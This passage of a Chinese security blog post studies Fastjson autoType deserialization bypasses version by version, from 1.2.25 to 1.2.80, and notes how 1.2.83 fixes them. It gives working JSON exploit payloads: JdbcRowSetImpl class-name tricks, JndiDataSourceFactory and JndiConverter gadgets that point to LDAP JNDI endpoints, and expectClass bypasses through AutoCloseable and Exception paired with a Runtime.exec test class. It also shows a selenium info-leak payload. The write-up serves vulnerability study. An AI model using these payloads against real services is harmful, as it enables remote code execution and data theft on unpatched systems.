+<p><img src="/2022/11/19/FastjsonBypass/11.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里有个问题就是，payload分为两段，大佬们说分为两段时写可能会出现问题，但本地测试时没发现啥问题（可能是因为程序太简单），真实环境的话比较复杂。</p>
+<h4 id="1-2-48-1-2-68"><a href="#1-2-48-1-2-68" class="headerlink" title="1.2.48 - 1.2.68"></a>1.2.48 - 1.2.68</h4><p>版本上到1.2.48，然后跑一下刚刚的payload，先来看一下爆什么样的错，emmm，还是这个<code>autoType is not support</code>，大概率就是缓存表没加进去或者说提前检测了一下</p>
+<p><img src="/2022/11/19/FastjsonBypass/12.png" srcset="/img/loading.gif" lazyload></p>
+<p>再来看一下<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/commit/11b92d9f33119ca2af1a3fe6f474de5c1810e686#diff-4dd688f7c20466c093fa85dd2e1b4cafb5ad57d469a0b38a3f205a09038fdb1d">改动情况</a></p>
+<p><img src="/2022/11/19/FastjsonBypass/13.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/11/19/FastjsonBypass/14.png" srcset="/img/loading.gif" lazyload></p>
+<p>这两个位置，就决定了以前的payload无法再使用，还有一些其他的地方可以稍微看看</p>
+<p>好了，这次寄了，缓存表那里动不了手了，但有大牛，大牛这次从期望类入手了，也就是<code>expectClass</code></p>
+<p>还是<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code></p>
+<p>这个方法一直在变，但是这里却不大影响理解此类的这个版本的绕过方法，已知该方法最终返回Class，也就是@type指定的类，并且检测是否是恶意类，所以此处的目的就是让checkAutoType成功加载想要加载的类：已知想要完成加载类的方式有：</p>
+<blockquote>
+<ol>
+<li>白名单                                —-&gt; ❎白名单不可控</li>
+<li>缓存表中存在                    —-&gt; ❎缓存表寄了</li>
+<li>有对应反序列化器的类     —-&gt; ❎写死的，动不了</li>
+<li>使用了 JSONType 注解     —-&gt; ❎开发自己写的，动不了</li>
+<li>有expectClass，期望类    —-&gt; ❎如果可控，则有一定可能</li>
+</ol>
+</blockquote>
+<p>这里稍微说一下自己理解的<code>expectClass</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">JSON.parseObject(s,Person.class);	<span class="hljs-comment">// 比如此处的Person.class就是expectClass</span><br><span class="hljs-comment">// 	当然需要字符串s中带有@type时才会走到checkAutoType(),才能够看到expectClass不为空</span><br><span class="hljs-comment">// 通常情况下：expectClass都是为null的</span><br></code></pre></td></tr></table></figure>
+
+<p>再来看一下为啥<code>expectClass</code>可控时，有可能实现类加载</p>
+<p><img src="/2022/11/19/FastjsonBypass/15.png" srcset="/img/loading.gif" lazyload></p>
+<p>在来看<code>expectClassFlag</code>的值是哪来的</p>
+<p><img src="/2022/11/19/FastjsonBypass/16.png" srcset="/img/loading.gif" lazyload></p>
+<p>再来看期望类<code>expectClass</code>是怎么来的，已知直接<code>parseObject()</code>走到<code>checkAutoType()</code>时，</p>
+<p>也就是在<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>里面时<code>expectClass</code>是默认为空的，所以得看其他地方调用的<code>checkAutoType()</code></p>
+<p>比如：<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze()</code></p>
+<p><img src="/2022/11/19/FastjsonBypass/17.png" srcset="/img/loading.gif" lazyload></p>
+<p>当然，还有一些其他的地方，也有可能可以利用，这里拿着作为学习例子，已知该方法是在使用<code>JavaBeanDeserializer</code>这个反序列化器进行反序列化时调用<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze()</code></p>
+<p>而<code>JavaBeanDeserializer</code>这个反序列化器是在反序列化某些类的时候使用，具体可以看<code>com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class&lt;?&gt;, java.lang.reflect.Type)</code>这个方法（获取什么样的反序列化器，由该方法决定）</p>
+<p>回到<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>在完成<code>checkAutoType</code>、获取到<code>JavaBeanDeserializer</code>这个反序列化器后，执行反序列化</p>
+<p><img src="/2022/11/19/FastjsonBypass/18.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> &lt;T&gt; <span class="hljs-function">T <span class="hljs-title">deserialze</span><span class="hljs-params">(DefaultJSONParser parser, // 封装的JSON字符串和一些其他东西</span></span><br><span class="hljs-params"><span class="hljs-function">                               Type type, // <span class="hljs-meta">@type</span>指定的那个类</span></span><br><span class="hljs-params"><span class="hljs-function">                               Object fieldName, // <span class="hljs-keyword">null</span></span></span><br><span class="hljs-params"><span class="hljs-function">                               Object object, // <span class="hljs-keyword">null</span></span></span><br><span class="hljs-params"><span class="hljs-function">                               <span class="hljs-keyword">int</span> features, //	<span class="hljs-number">0</span></span></span><br><span class="hljs-params"><span class="hljs-function">                               <span class="hljs-keyword">int</span>[] setFlags)</span> </span>&#123;	<span class="hljs-comment">// null</span><br>             <br>    		...	<span class="hljs-comment">// 忽略一些</span><br>                <span class="hljs-keyword">if</span> (!matchField) &#123;	<span class="hljs-comment">// matchField默认为false</span><br>                    key = lexer.scanSymbol(parser.symbolTable);	<span class="hljs-comment">// 扫描特殊符号</span><br>                    ...	<span class="hljs-comment">// 再忽略一些代码</span><br><br>                    <span class="hljs-keyword">if</span> ((typeKey != <span class="hljs-keyword">null</span> &amp;&amp; typeKey.equals(key))<br>                            || JSON.DEFAULT_TYPE_KEY == key) &#123;	<span class="hljs-comment">// 当key为@type时进入，其他两个就不说了</span><br>                        lexer.nextTokenWithColon(JSONToken.LITERAL_STRING);<br>                        <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;<br>                            String typeName = lexer.stringVal();	<span class="hljs-comment">// 获取@type后的值</span><br>                            lexer.nextToken(JSONToken.COMMA);<br><br>                            <span class="hljs-keyword">if</span> (typeName.equals(beanInfo.typeName)|| parser.isEnabled(Feature.IgnoreAutoType)) &#123;	<span class="hljs-comment">// 当前@type后的值，与之前@type后的值相等时进入</span><br>                                <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.RBRACE) &#123;<br>                                    lexer.nextToken();<br>                                    <span class="hljs-keyword">break</span>;<br>                                &#125;<br>                                <span class="hljs-keyword">continue</span>;<br>                            &#125;<br>                            <br>							<span class="hljs-comment">// 直接就返回空了，因为没有用JSONType注解</span><br>                            ObjectDeserializer deserializer = getSeeAlso(config, <span class="hljs-keyword">this</span>.beanInfo, typeName);<br>                            Class&lt;?&gt; userType = <span class="hljs-keyword">null</span>;<br><br>                            <span class="hljs-keyword">if</span> (deserializer == <span class="hljs-keyword">null</span>) &#123;<br>                                Class&lt;?&gt; expectClass = TypeUtils.getClass(type);	<span class="hljs-comment">// type为传入的一个参数</span><br>                                <span class="hljs-comment">// 此时expectClass不为空</span><br>                                userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());<br>                                deserializer = parser.getConfig().getDeserializer(userType);<br>                                <span class="hljs-comment">// 获取相应的反序列化器</span><br>                            &#125;<br>							<span class="hljs-comment">// 进行反序列化</span><br>                            Object typedObject = deserializer.deserialze(parser, userType, fieldName);<br>                            <br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以，这里的<code>expectClass</code>来源算是搞清楚了</p>
+<p>并且这里在通过checkAutoType之后，就进行了反序列化，基本上的流程都走完了</p>
+<p>捋一下这个绕过思路：</p>
+<blockquote>
+<ol>
+<li>checkAutoType方法中，当expectClass不为空时，会对指定类进行加载</li>
+<li>当指定的类是期望类的子类或实现类时能够成功返回</li>
+<li>当传入的第1个@type所指定的类使用<code>JavaBeanDeserializer</code>这个反序列化器，并且在后面又出现一个@type时，会再次执行checkAutoType，并且此时expectClass为第1个@type所指定的类</li>
+<li>所以，找一个类或接口，其本身或子类等中存在可以利用的点</li>
+</ol>
+</blockquote>
+<p>这里以<code>java.lang.AutoCloseable</code>为例</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">AutoCloseable</span></span>&#123;<br>    <br>    <span class="hljs-keyword">public</span> String cmd;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getCmd</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> cmd;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setCmd</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        Runtime.getRuntime().exec(cmd);<br>        <span class="hljs-keyword">this</span>.cmd = cmd;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>    <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mechoy.Test&quot;</span>,<br>    <span class="hljs-attr">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;calc&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/19/FastjsonBypass/19.png" srcset="/img/loading.gif" lazyload></p>
+<p>到此这个绕过就算是整明白了，接下来就是找利用链了，这里自己还不咋太会找，就先看看大佬们的，学习学习，向大佬们致敬🫡</p>
+<p>这里就复现一个简单的东西吧，有个依赖，然后利用的点也不是<code>java.lang.AutoCloseable</code>，而是<code>java.lang.Exception</code>，原理类似，只不过代码不太一样，但不影响理解</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.seleniumhq.selenium<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>selenium-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Exception&quot;</span>, <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.openqa.selenium.WebDriverException&quot;</span>,<span class="hljs-attr">&quot;$ref&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>简析：</p>
+<ol>
+<li>java.lang.Exception该类存在于缓存表中</li>
+<li>org.openqa.selenium.WebDriverException这个类会输出一些敏感信息，同时该类又实现了Exception接口</li>
+<li>org.openqa.selenium.WebDriverException该类及其父类中有一些符合条件的getter方法</li>
+<li>fastjson支持循环引用，并且是缺省打开的。所以可以利用$ref去调用getter方法</li>
+</ol>
+</blockquote>
+<p><img src="/2022/11/19/FastjsonBypass/20.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/11/19/FastjsonBypass/21.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以当场景测试代码如下情况时，其实也不需要$ref</p>
+<p><img src="/2022/11/19/FastjsonBypass/22.png" srcset="/img/loading.gif" lazyload></p>
+<p>当然真实场景肯定各种各样的，肯定不会像这么简单，肯定需要根据各种各样的实际情况来进行修改</p>
+<h4 id="1-2-69-1-2-80"><a href="#1-2-69-1-2-80" class="headerlink" title="1.2.69 - 1.2.80"></a>1.2.69 - 1.2.80</h4><p>先搞一下原来的例子，看一下抛什么异常</p>
+<p><img src="/2022/11/19/FastjsonBypass/23.png" srcset="/img/loading.gif" lazyload></p>
+<p>又不支持了，看一下代码是哪里的问题，这里expectClassFlag的判断处增加了<code>java.lang.AutoCloseable</code>的hash值，导致expectClassFlag为false，然后下面的那个类加载的地方就进不去了，然后就报异常喽</p>
+<p><img src="/2022/11/19/FastjsonBypass/24.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里还是要要回到上面的<code>java.lang.Exception</code>中</p>
+<p>在<code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze</code>中，还有一个，这里传入的是<code>java.lang.Throwable</code></p>
+<p><img src="/2022/11/19/FastjsonBypass/25.png" srcset="/img/loading.gif" lazyload></p>
+<p>再来看一下何种情况下会得到这个反序列化器</p>
+<p><img src="/2022/11/19/FastjsonBypass/27.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>java.lang.Throwable</code>的类图</p>
+<p><img src="/2022/11/19/FastjsonBypass/26.png" srcset="/img/loading.gif" lazyload></p>
+<p>下面就跟1.2.68的绕过思路是一样的了，也就没啥了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 所以改一下测试类</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Exception</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String cmd;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getCmd</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> cmd;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setCmd</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        Runtime.getRuntime().exec(cmd);<br>        <span class="hljs-keyword">this</span>.cmd = cmd;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/19/FastjsonBypass/28.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后就是找利用链了</p>
+<h4 id="1-2-83"><a href="#1-2-83" class="headerlink" title="1.2.83"></a>1.2.83</h4><p>看一下这个是怎修复的，就是在checkAutoType中加了个if</p>
+<p><img src="/2022/11/19/FastjsonBypass/44.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>&lt;=1.2.47时使用的是缓存：</p>
+<blockquote>
+<p>1.当映射表中存在该类的Class类型时，fastjson认为该类已经加载过了，是比较安全的：</p>
+<p>​    对应代码<code>TypeUtils.getClassFromMapping(typeName)</code>，所以若能够将恶意的类的class添加至缓存表中，则可以跳过<code>checkAutoType</code>，在<code>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)</code>中存在向缓存表中添加数据的逻辑，并且<strong>参数1</strong>就是类名</p>
+<ol start="2">
+<li>fastjson对一些类提供了专属的反序列化器，例如<code>java.lang.Class</code>—&gt; <code>MiscCodec</code></li>
+<li>这些类也是可以跳过checkAutoType检测的</li>
+<li>在<code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code>，当反序列化的是一个<code>java.lang.Class</code>类型时，会接收<code>val</code>参数，并调用<code>TypeUtils#loadClass(val,ClassLoader)</code></li>
+<li>如果此时val的值是恶意类的类名，则会将该恶意类的全类名添加至缓存表</li>
+<li>此时再将恶意类传入，就能跳过checkAutoType的检测</li>
+</ol>
+</blockquote>
+<p>&lt;=1.2.80时使用的expectClass</p>
+<blockquote>
+<ol>
+<li><p>checkAutoType当expectClass不为空时，并且当前类不在黑名单中，且该类是expectClass的子类或实现类就可以实现加载、</p>
+</li>
+<li><p>其中在JavaBeanDeserializer和ThrowableDeserializer中有调用checkAutoType，并且也不为空</p>
+</li>
+<li><p>所以就是先传入一个类，使其获取的反序列化器是上面两种，然后再接@type，再传入恶意类，具体流程还是要看代码</p>
+</li>
+<li><p>这种就可以实现绕过checkAutoType，然后就是找利用链了</p>
+</li>
+</ol>
+</blockquote>
+<h3 id="0x02-开启AutoType"><a href="#0x02-开启AutoType" class="headerlink" title="0x02 开启AutoType"></a>0x02 开启AutoType</h3><p>fastjson默认是不开启AutoType，开启的话需要添加如下代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-keyword">true</span>);	<span class="hljs-comment">// IDEA会爆红，但问题不大，可以跑</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h4><p>该版本增加了checkAutoType，并且增加了黑白名单，黑名单见附录，白名单默认为空</p>
+<p>判断是否为黑名单中的类比较方法为<code>className.startsWith(accept)</code>通过黑名单校验之后，调用<code>TypeUtils.loadClass()</code>进行类加载，来到关键点，因为java对全类名有一些不同的写法，所以这里在进行类加载的同时删除了一些不同的写法</p>
+<ol>
+<li>[ —&gt; 数组类的写法</li>
+<li>Lxxx; —&gt; 另一种全类名写法</li>
+</ol>
+<p><img src="/2022/11/19/FastjsonBypass/29.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<ol>
+<li>由于检验黑名单的时候使用的是字符串的内容校验，所以使用不同的全类名写法即可绕过黑名单</li>
+<li>不同的写法在类加载的之前会删除掉，所以同样能够实现类加载</li>
+</ol>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://xxx&quot;</span>,<span class="hljs-attr">&quot;AutoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://xxx&quot;</span>,<span class="hljs-attr">&quot;AutoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;]&#125;<br><span class="hljs-comment">// 需要注意第二poc的逗号问题</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/19/FastjsonBypass/30.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h4><p>1.2.42版本时，开始采用hash值进行黑名单校验，并且在检测到是以<code>L</code>开头，以<code>;</code>结尾的全类名时，会先将这两个东西删掉，然后在进行黑名单的判断，黑名单校验通过之后进入<code>TypeUtils.loadClass()</code>进行类加载，在类加载时，如果存在多个L ; 会递归删除，所以倒不用担心多出来的<code>L</code>或<code>;</code>会影响类加载</p>
+<p><img src="/2022/11/19/FastjsonBypass/31.png" srcset="/img/loading.gif" lazyload></p>
+<p>来一个双写绕过就好了，并且这里并没有对数组类那里进行操作，所以数组的写法还是能用的</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;\<span class="hljs-attr">&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap:xxx\&quot;,\&quot;AutoCommit\&quot;:\&quot;true\&quot;&#125;</span><br><span class="hljs-attr">&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;ldap:xxx\&quot;,\&quot;AutoCommit\&quot;:\&quot;true\&quot;&#125;]&#125;</span><br><span class="hljs-attr">// 多个L ;</span><br><span class="hljs-attr">&#123;\&quot;@type\&quot;:\&quot;LLLLcom.sun.rowset.JdbcRowSetImpl;;;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap:x\&quot;,\&quot;AutoCommit\&quot;:\&quot;true\&quot;&#125;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/19/FastjsonBypass/32.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="1-2-43"><a href="#1-2-43" class="headerlink" title="1.2.43"></a>1.2.43</h4><p>这里，若是全类名的第一第二个字符是L，那就直接抛异常</p>
+<p><img src="/2022/11/19/FastjsonBypass/33.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以<code>L</code>,<code>;</code>这条路走不通了，用数组类的那个poc就ok了，写poc的时候需要注意<code>dataSourceName</code>前的那个逗号</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;\<span class="hljs-attr">&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;ldap:xxx\&quot;,\&quot;AutoCommit\&quot;:\&quot;true\&quot;&#125;]&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="1-2-44-1-2-45"><a href="#1-2-44-1-2-45" class="headerlink" title="1.2.44-1.2.45"></a>1.2.44-1.2.45</h4><p>在1.2.44版本时，还是checkAutoType中，这里对首字符和尾字符进行了一下计算，然后就禁了某些东西</p>
+<p><img src="/2022/11/19/FastjsonBypass/34.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后就结束了L<code> </code>;<code> </code>[`   这几个字符罪恶的一生了</p>
+<p>不过这个时候黑名单的内容还是比较少的，所以就可以找找黑名单之外的一些类，比如</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>这个类里面有个<code>lookup()</code>,并且这个类不在黑名单里面</p>
+<p><img src="/2022/11/19/FastjsonBypass/35.png" srcset="/img/loading.gif" lazyload></p>
+<p>setter方法满足，传入的是一个<code>Properties</code>，这个类怎么说呢，他其实就类似于是一种键值对的形式，所以传入setter方法的值的时候需要注意下，其他的倒也么有什么，注意key是<code>data_source</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<span class="hljs-attr">&quot;properties&quot;</span>:&#123;<span class="hljs-attr">&quot;data_source&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:8888/pbbLLAew&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/19/FastjsonBypass/36.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="1-2-46-1-2-62"><a href="#1-2-46-1-2-62" class="headerlink" title="1.2.46-1.2.62"></a>1.2.46-1.2.62</h4><p><code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>这个类在1.2.46就被拉黑了，但还有新的链</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-reflect<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.7<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>在这个包里面有<code>org.apache.xbean.propertyeditor.JndiConverter</code>,这个类里面有个JNDI注入</p>
+<p><img src="/2022/11/19/FastjsonBypass/37.png" srcset="/img/loading.gif" lazyload></p>
+<p>但这个方法fastjson调用不了，需要找找在哪里调用的这个方法</p>
+<blockquote>
+<p>org.apache.xbean.propertyeditor.AbstractConverter#setAsText<br>    org.apache.xbean.propertyeditor.AbstractConverter#toObject<br>        org.apache.xbean.propertyeditor.JndiConverter#toObjectImpl</p>
+<p>其中JndiConverter是AbstractConverter的子类</p>
+</blockquote>
+<p>再看一下参数的传递，emmm，都是那个text，也没有什么太多的处理</p>
+<p><img src="/2022/11/19/FastjsonBypass/38.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="hljs-attr">&quot;asText&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:8888/BvdpLNnZ&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/19/FastjsonBypass/39.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="1-2-63-1-2-66"><a href="#1-2-63-1-2-66" class="headerlink" title="1.2.63-1.2.66"></a>1.2.63-1.2.66</h4><p><code>org.apache.xbean.propertyeditor.JndiConverter</code>这个类被拉黑了，然后又是新的利用链</p>
+<p>比如：<code>org.apache.shiro.realm.jndi.JndiRealmFactory</code>，当然网上还有一堆其他的链子，搜集搜集找找就能用了</p>
